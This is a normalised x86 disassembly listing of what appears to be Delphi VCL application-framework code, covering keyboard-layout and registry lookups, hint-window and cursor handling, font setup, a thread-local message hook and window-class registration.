mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_4040ac
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_41adb8
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_408f64
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_45add4
test al al
je r-xdata
xor eax eax
push ebp
push sub_46d353
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_40431c
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_40431c
sub_46d408
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_46fc68
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46fa1c
mov dl 0x1
mov eax [ rw-data ]
call sub_46fa1c
sub_46d474
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_46d49c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_46d474
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_406cf0
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_406c64
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_46d52c
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_46d671
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46fa1c
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_4245b0
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_4245b0
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_424694
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_4245b0
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_4245b0
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_4245b0
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_46fa1c
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_4243f4
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_4243f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d678
cmp [ rw-data ] 0x0
je r-xdata
sub_46d6b0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_46d710
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_46d84c ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_46d8c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_46d018
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4189b0
mov dl [ ebp - 0x1 ]
call sub_46d710
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_46d004
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_418854
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_418a2c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_4189b0
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_46d6b0
test al al
je r-xdata
inc esi
sub_46da0c
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_46d018
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_46d004
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_46da64
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_46da0c
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46dade
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_46d8c0
pop ecx
push ebp
mov al 0x2
call sub_46d8c0
pop ecx
push ebp
mov al 0x3
call sub_46d8c0
pop ecx
push ebp
mov al 0x4
call sub_46d8c0
pop ecx
push ebp
mov al 0x5
call sub_46d8c0
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4032b0
retn
sub_46daec
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46d680
xor eax eax
push ebp
push sub_46db65
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46da64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_46d688
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_46db80
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_4040ac
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_404100
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_46dbd8
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push sub_46dc09
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_470024
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_46dc2c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_44e0cc
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_4700a0
sub_46dc88
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46f140
sub_46dccc
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_46dc88
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_46dc2c
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_46dd40
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_46dd9c
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_46ddcc
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_46ddf4
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_46dd9c
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_46ddcc
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_46ddcc
sub_46de34
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_421370
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_46f50c
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4296b0
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_429a80
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_46fca4
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40c88c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_46f704
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40c8b4
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_408944
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_40431c
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_46fe80
mov eax ebx
call sub_470844
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_46e13c
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_46e01d
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_403664
mov ebx edx
mov esi eax
mov eax esi
call sub_470854
mov [ esp + 0x4 ] esi
mov [ esp ] sub_46f50c
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_46f704
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_4700a0
xor edx edx
mov eax esi
call sub_46fa1c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4213bc
push esi
push sub_46e570
mov eax esi
call sub_46f2f8
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_405944
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_4032b0
mov eax [ esi + 0x90 ]
call sub_4032b0
mov eax [ esi + 0x98 ]
call sub_4032b0
test bl bl
jle r-xdata
call sub_422498
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_46e13c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46e2dd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e2e4
lea eax [ ebp - 0x2c ]
call sub_4040ac
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_46e6bc
call sub_422400
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_40456c
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_406d78
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_4040ac
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_46edc0
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_46edc0
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_46e2ec
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_46d020
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_46e34c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_418854
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_456054
cmp ebx eax
je r-xdata
sub_46e3bc
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_46e34c
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
